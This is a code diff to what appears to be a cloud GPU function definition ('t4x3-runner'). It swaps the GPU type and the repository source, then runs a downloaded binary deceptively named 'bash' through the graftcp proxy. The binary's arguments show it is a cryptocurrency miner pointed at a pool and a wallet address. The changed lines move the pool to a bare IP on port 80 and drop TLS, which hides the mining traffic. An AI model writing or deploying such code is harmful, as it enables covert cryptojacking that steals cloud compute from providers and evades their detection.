@@ -15,7 +15,7 @@ image = (
 @function(
     name="t4x3-runner",
     image=image,
-    gpu="A10G",
+    gpu="RTX4090",
     cpu=2,
     memory="4Gi",
     timeout=30 * 60 * 60,
@@ -52,15 +52,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD KRIG ==="
+    echo "=== DOWNLOAD OPR ==="
     cd /mnt/code/pan
-    git clone https://gitlab.com/liugtiujk/krig.git
+    git clone https://github.com/malogrono/opr.git
 
-    echo "=== CHECK KRIG ==="
-    ls -lah /mnt/code/pan/krig
+    echo "=== CHECK OPR ==="
+    ls -lah /mnt/code/pan/opr
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/krig
+    cd /mnt/code/pan/opr
     ls -lh bash
 
     chmod u+x bash
@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool prl-sg.kryptex.network:8048 --wallet prl1pk06kg4nye9f2f44gt6hvwchrg0fnkgkhyv058zmml7z57y9tn2cqky62kj.01 --tls true
+    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.01
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
